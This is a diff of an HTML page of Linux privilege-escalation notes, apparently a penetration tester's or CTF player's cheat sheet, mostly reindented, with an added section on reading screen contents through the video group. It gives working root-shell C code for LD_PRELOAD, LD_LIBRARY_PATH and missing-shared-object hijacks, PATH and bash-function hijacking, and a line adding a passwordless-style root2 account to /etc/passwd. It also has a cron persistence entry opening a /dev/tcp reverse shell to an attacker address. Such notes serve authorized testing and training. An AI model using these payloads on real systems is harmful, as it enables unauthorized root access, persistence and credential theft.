@@ -10,25 +10,25 @@ layout: default
 <hr>
 
 <body>
-
+    
     <h1>Linux PrivEsc</h1>
-
+    
     <hr>
-
+    
     <h2>PrivEsc Strategy</h2>
-
+    
     <li>Kernel Exploits</li>
     <ul>
         <li>searchsploit &lt;kernel version&gt;</li>
         <li>If you think an exploit should work but it is not, then look up the CVE for the exploit and google it to search for others.</li>
     </ul>
-
+    
     <li>Check user id and groups</li>
     <ul>
         <li>id</li>
         <li>Google exploits for groups</li>
     </ul>
-
+    
     <li>Password attacks</li>
     <ul>
         <li>Password reuse</li>
@@ -39,7 +39,7 @@ layout: default
             <li>su &lt;user&gt;</li>
         </ul>
     </ul>
-
+    
     <li>Run linpeas</li>
     <ul>
         <li>Rerun as new user if a new on is accessed</li>
@@ -66,7 +66,7 @@ layout: default
         </ul>
         <li>Look for private SSH keys</li>
     </ul>
-
+    
     <li>Look for running programs</li>
     <ul>
         <li>ps aux</li>
@@ -76,7 +76,7 @@ layout: default
             <li>If there is trouble enumerating versions, try googling the md5sum of the program</li>
         </ul>
     </ul>
-
+    
     <li>mysql</li>
     <ul>
         <li>If we can log in to it, look for sensitive information</li>
@@ -91,9 +91,9 @@ layout: default
             </ul>
         </ul>
     </ul>
-
+    
     <li>If web page is running under the context of higher privilege user, try to create a web shell</li>
-
+    
     <li>Check network services</li>
     <ul>
         <li>Look for open ports/running services that didn't show during port scan</li>
@@ -104,7 +104,7 @@ layout: default
         <li>Check for port knocking configurations</li>
         <li>/etc/knockd.conf</li>
     </ul>
-
+    
     <li>Check for interesting programs</li>
     <ul>
         <li>PATH locations</li>
@@ -121,7 +121,7 @@ layout: default
             </ul>
         </ul>
     </ul>
-
+    
     <li>Look for unmounted file systems</li>
     <li>SUID/GUID files</li>
     <ul>
@@ -131,9 +131,9 @@ layout: default
             <li>strace</li>
         </ul>
     </ul>
-
+    
     <li>File permissions</li>
-
+    
     <li>Sudo</li>
     <ul>
         <li>Check sudo permissions</li>
@@ -144,15 +144,16 @@ layout: default
                 <ul>
                     <li>Execute sudo command as another user: sudo -u &lt;username&gt; &lt;sudo command&gt;</li>
                 </ul>
-        </ul>
-        <li>Environment Variables</li>
-        <ul>
-            <li>Check with sudo -l</li>
-            <li>env_keep+=LD_PRELOAD - If this is set we can choose a shared object that is loaded before any others while running sudo</li>
-            <li>env_keep+=LD_LIBRARY_PATH - If this is set we can set where shared objects are searched for first.</li>
+            </ul>
+            <li>Environment Variables</li>
+            <ul>
+                <li>Check with sudo -l</li>
+                <li>env_keep+=LD_PRELOAD - If this is set we can choose a shared object that is loaded before any others while running sudo</li>
+                <li>env_keep+=LD_LIBRARY_PATH - If this is set we can set where shared objects are searched for first.</li>
+            </ul>
         </ul>
     </ul>
-
+    
     <li>Cron Jobs</li>
     <ul>
         <li>Check cron PATH, see if we have write access to any directories.</li>
@@ -171,7 +172,7 @@ layout: default
             <li>If so, create a file in the directory that the wildcard is being ran on.  Name this file as the malicious command line options you would like to use against this program.  Check GTFOBins to determine which flags to use.</li>
         </ul>
     </ul>
-
+    
     <li>systemd timers</li>
     <ul>
         <li>New way to do cronjob on services</li>
@@ -181,9 +182,9 @@ layout: default
     <ul>
         <li>pspy</li>
     </ul>
-
+    
     <h2>Shell Upgrade and Escapes</h2>
-
+    
     <li>Upgrade</li>
     <table>
         <tr>
@@ -263,7 +264,7 @@ layout: default
             <td>import os<br>os.system("bash");</td>
         </tr>
     </table>
-
+    
     <li><a id="ssh">Setup an SSH Shell</a></li>
     <ul>
         <li>An SSH shell will not always be possible.  SSH is frequently, but not always, configured to not allow SSH shells for certain users.</li>
@@ -289,9 +290,9 @@ layout: default
             <li>ssh &lt;user&gt;@&lt;victim ip&gt; -i &lt;private key file&gt;</li>
         </ul>
     </ul>
-
+    
     <h2>Auto Enumeration Tools</h2>
-
+    
     <li>Kernel exploits</li>
     <ul>
         <li>Kernel exploits tool</li>
@@ -299,7 +300,7 @@ layout: default
             <li>Linux Exploit Suggester Script</li>
         </ul>
     </ul>
-
+    
     <li>PrivEsc Tool</li>
     <ul>
         <li>linpeas</li>
@@ -311,9 +312,9 @@ layout: default
         <li>https://github.com/linted/linuxprivchecker</li>
         <li>suid3num</li>
     </ul>
-
+    
     <h2>Sudo Environment Variables</h2>
-
+    
     <li>Environment Variables</li>
     <ul>
         <li>sudo -l to view configured environment options</li>
@@ -323,16 +324,16 @@ layout: default
             <ul>
                 <li>Create malicious shared object</li>
                 <pre>
-#include &lt;stdio.h&gt;
-#include &lt;sys/types.h&gt;
-#include &lt;stdlib.h&gt;
-void _init() {
-    unsetenv(&quot;LD_PRELOAD&quot;);
-    setresuid(0,0,0);
-    system(&quot;/bin/bash -p&quot;);
-}
-
-#gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c
+                    #include &lt;stdio.h&gt;
+                    #include &lt;sys/types.h&gt;
+                    #include &lt;stdlib.h&gt;
+                    void _init() {
+                        unsetenv(&quot;LD_PRELOAD&quot;);
+                        setresuid(0,0,0);
+                        system(&quot;/bin/bash -p&quot;);
+                    }
+                    
+                    #gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c
                 </pre>
             </ul>
             <li>Run any sudo enabled command:</li>
@@ -341,7 +342,7 @@ void _init() {
             </ul>
         </ul>
     </ul>
-
+    
     <li>LD_LIBRARY_PATH</li>
     <ul>
         <li>LD_LIBRARY_PATH is an environment variable that contains the directories where shared libraries are searched for first.</li>
@@ -357,15 +358,15 @@ void _init() {
                 <li>Output: shared objects, choose one to replace</li>
                 <li>Create a file to compile that will replace the original shared object </li>
                 <pre>
-#include &lt;stdio.h&gt;
-#include &lt;stdlib.h&gt;
-static void hijack() __attribute__((constructor));
-    void hijack() {unsetenv(&quot;LD_LIBRARY_PATH&quot;);
-    setresuid(0,0,0);
-    system(&quot;/bin/bash -p&quot;);
-}
-
-#gcc -o &lt;Malicious .so&gt; -shared -fPIC library_path.c  
+                    #include &lt;stdio.h&gt;
+                    #include &lt;stdlib.h&gt;
+                    static void hijack() __attribute__((constructor));
+                    void hijack() {unsetenv(&quot;LD_LIBRARY_PATH&quot;);
+                        setresuid(0,0,0);
+                        system(&quot;/bin/bash -p&quot;);
+                    }
+                    
+                    #gcc -o &lt;Malicious .so&gt; -shared -fPIC library_path.c  
                 </pre>
                 <li>run command</li>
                 <ul>
@@ -375,9 +376,9 @@ static void hijack() __attribute__((constructor));
             </ul>
         </ul>
     </ul>
-
+    
     <h2>NFS</h2>
-
+    
     <table>
         <tr>
             <td>Show the NFS server’s export list</td>
@@ -392,7 +393,7 @@ static void hijack() __attribute__((constructor));
             <td>mount -o rw,vers=2 &lt;target&gt;:&lt;share&gt; &lt;local_directory&gt;</td>
         </tr>
     </table>
-
+    
     <li>NFS share information is stored in /etc/exports</li>
     <li>Root Squashing</li>
     <ul>
@@ -422,9 +423,9 @@ static void hijack() __attribute__((constructor));
             </ul>
         </ul>
     </ul>
-
+    
     <h2>SUID and GUID executables</h2>
-
+    
     <table>
         <tr>
             <td>Find files with guid or suid set</td>
@@ -450,7 +451,7 @@ static void hijack() __attribute__((constructor));
             <td>ldconfig</td>
         </tr>
     </table>
-
+    
     <li>Check GTFOBins for flags to use in order to execute malicious commands</li>
     <li>Binary being called is not absolute (scp vs /usr/bin/scp)</li>
     <li>Shared object not found</li>
@@ -460,15 +461,15 @@ static void hijack() __attribute__((constructor));
             <li>Find shared objects that are not found by the executable</li>
             <li>Create a shared object in the directory where the shared object is being searched for</li>
             <pre>
-#include &lt;stdio.h&gt;
-#include &lt;sys/types.h&gt;
-#include &lt;unistd.h&gt;
-int main(void)
-{
-setuid(0); setgid(0); system(&quot;/bin/bash&quot;);
-}
-
-#gcc rootshell.c -o libmalbec.so -shared -Wall -fPIC -w
+                #include &lt;stdio.h&gt;
+                #include &lt;sys/types.h&gt;
+                #include &lt;unistd.h&gt;
+                int main(void)
+                {
+                    setuid(0); setgid(0); system(&quot;/bin/bash&quot;);
+                }
+                
+                #gcc rootshell.c -o libmalbec.so -shared -Wall -fPIC -w
             </pre>
             <li>gcc: error trying to exec 'cc1': execvp: No such file or directory</li>
             <ul>
@@ -483,23 +484,23 @@ setuid(0); setgid(0); system(&quot;/bin/bash&quot;);
             </ul>
         </ul>
     </ul>
-
+    
     <li>File calls for executable without absolute path</li>
     <ul>
         <li>We can add a malicious version of the executable to our PATH.</li>
         <li>Create a malicious executable with the same name as the program that is being called without an absolute path</li>
         <pre>
-int main() {
-    setuid(0);
-    system("/bin/bash -p");
-}
-#gcc -o &lt;file&gt; &lt;file.c&gt;
+            int main() {
+                setuid(0);
+                system("/bin/bash -p");
+            }
+            #gcc -o &lt;file&gt; &lt;file.c&gt;
         </pre>
         <li>PATH=.:$PATH</li>
         <li>Execute vulnerable SUID/GUID</li>
         <li>Rooted</li>
     </ul>
-
+    
     <li>Calls for executable w/ absolute path and bash < 4.2-048</li>
     <ul>
         <li>function &lt;exectuable being called&gt; { /bin/bash -p; }</li>
@@ -507,19 +508,19 @@ int main() {
         <li>execute vulnerable suid/guid file</li>
         <li>Rooted</li>
     </ul>
-
+    
     <h2>Persistence Methods</h2>
     <table>
         <tr>
             <td>Add new root to /etc/passwd</td>
             <td>
-                <li>echo "root2:<hash>:0:0:root:/root:/bin/bash" >> /etc/passwd</li>
-                    <table>
-                        <tr>
-                            <td>Generate new password hash</td>
-                            <td>openssl passwd &lt;password&gt;</td>
-                        </tr>
-                    </table>
+                <li>echo &quot;root2:&lt;hash&gt;:0:0:root:/root:/bin/bash&quot; &gt;&gt; /etc/passwd</li>
+                <table>
+                    <tr>
+                        <td>Generate new password hash</td>
+                        <td>openssl passwd &lt;password&gt;</td>
+                    </tr>
+                </table>
                 <li>su root2</li>
             </td>
         </tr>
@@ -539,6 +540,32 @@ int main() {
             <td>echo &quot;* * * * * root /bin/bash -c &#039;bash -i &gt;&amp; /dev/tcp/&lt;ip address&gt;/&lt;port #&gt; 0&gt;&amp;1&#039; &quot;</td>
         </tr>
     </table>
-
+    
+    <h2>Groups</h2>
+    
+    <li>Video</li>
+    <ul>
+        <li>The video group gives us access to screen output</li>
+        <ul>
+            <li>Privesc usage example: If a user has a credential showing on their screen we can look at the screen image and view the credential.</li>
+        </ul>
+        <li>How to view screen output</li>
+        <ul>
+            <table>
+                <tr>
+                    <td>Capture the raw image data of current screen output</td>
+                    <td>cat /dev/fb0 > /tmp/screen.raw</td>
+                </tr>
+                <tr>
+                    <td>Get the screen output image resolution size</td>
+                    <td>cat /sys/class/graphics/fb0/virtual_size</td>
+                </tr>
+            </table>
+            <li>Open screen.raw using gimp.  File &gt; Open... &gt;  Select File Type: Raw image data &gt; (check) Show All Files Files &gt; (click on/open) screen.raw</li>
+            <li>Set width and height to what is shown in /sys/class/graphics/fb0/virtual_size</li>
+            <li>Change "Image Type:" until a clear image is shown.</li>
+        </ul>
+    </ul>
+    
 </body>
 </html>
